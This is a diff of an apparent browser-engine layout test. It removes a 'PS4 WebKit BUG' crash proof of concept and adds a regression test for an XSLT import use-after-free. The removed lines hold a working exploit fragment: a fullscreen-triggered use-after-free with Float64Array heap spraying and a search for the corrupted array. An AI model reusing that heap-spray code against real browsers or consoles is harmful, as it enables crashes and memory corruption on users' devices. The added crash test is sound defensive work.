@@ -1,63 +1,35 @@
-<!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 WebKit BUG</title>
 </head>
 <body>
-
-<h1>Fullscreen Crash </h1>
-
-<button onclick="runCrashPoC()">Run</button>
-<div id="crash-result"></div>
-
+<!-- Test that compiling an XSL stylesheet with a still-loading import subresource does not
+     cause a use-after-free when the delayed subresource later arrives. -->
+<p>This test passes if it does not crash.</p>
+<iframe id="f" src="resources/xslt-import-delayed-subresource-target.xml"></iframe>
 <script>
-function runCrashPoC() {
-    const result = document.getElementById('crash-result');
-    result.innerHTML = '<h4>Press OPTIONS button</h4>';   
-    
-    let controllers = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        controllers.push(arr);
+// Wait for root.xsl and child.xsl to load (but not the delayed grandchild).
+// Then inject and immediately remove an embedded XSL processing instruction
+// to trigger scheduleToApplyXSLTransforms(), which will attempt to compile
+// the partially-loaded import chain.
+setTimeout(() => {
+    try {
+        const doc = document.getElementById('f').contentDocument;
+        // Create an embedded XSL PI (href="#x") which unconditionally calls
+        // scheduleToApplyXSLTransforms() via the embedded branch of
+        // ProcessingInstruction::checkStyleSheet().
+        const pi = doc.createProcessingInstruction("xml-stylesheet", 'type="text/xsl" href="#x"');
+        doc.insertBefore(pi, doc.firstChild);
+        pi.remove();
+    } catch (e) {
+        // Cross-origin or other access error is OK - test still verifies no crash.
     }
-    
-    const elem = document.documentElement;
-    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '<p>UAF triggered</p>';
-        
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
-        }
-        
-        let corrupted = null;
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
-                corrupted = controllers[i];
-                break;
-            }
-        }
-        
-        if (corrupted) {         
-            
-            setTimeout(() => {
-                // This specific sequence triggers crash
-                document.open();
-                document.write('<html><body><h1>Failed - Reboot or Try again</h1></body></html>');
-                document.close();
-                setTimeout(() => location.reload(), 5000);
-            }, 3000);
-        }
-    };
-}
+
+    // Wait long enough for the delayed grandchild to arrive and trigger
+    // parseString() on the grandchild stylesheet. Without the fix, this
+    // dereferences a freed m_stylesheetDoc in the parent (child.xsl).
+    setTimeout(() => {       
+    }, 3000);
+}, 500);
 </script>
 </body>
 </html>
